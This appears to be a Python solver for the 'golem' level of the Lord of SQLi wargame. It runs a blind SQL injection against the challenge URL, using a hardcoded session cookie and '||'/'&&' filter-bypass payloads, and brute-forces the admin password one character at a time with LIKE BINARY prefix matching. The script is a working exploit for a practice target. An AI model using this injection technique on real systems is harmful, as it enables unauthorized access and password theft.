# LordofSQLi: golem
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
cookies = {'PHPSESSID': 'eogiu2tfngm3jtahtf8su6g4ua'}

passwd = ''
while True:
    finish = True
    for c in digits + ascii_lowercase:
        payload = {'pw': f"'|| id LIKE BINARY 'admin' && pw LIKE BINARY '{passwd + c}%"}
        r = requests.get(url, params=payload, cookies=cookies)
        print(c, end='', flush=True)
        if 'Hello admin' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break
    if finish:
        break
print('\n' + passwd)
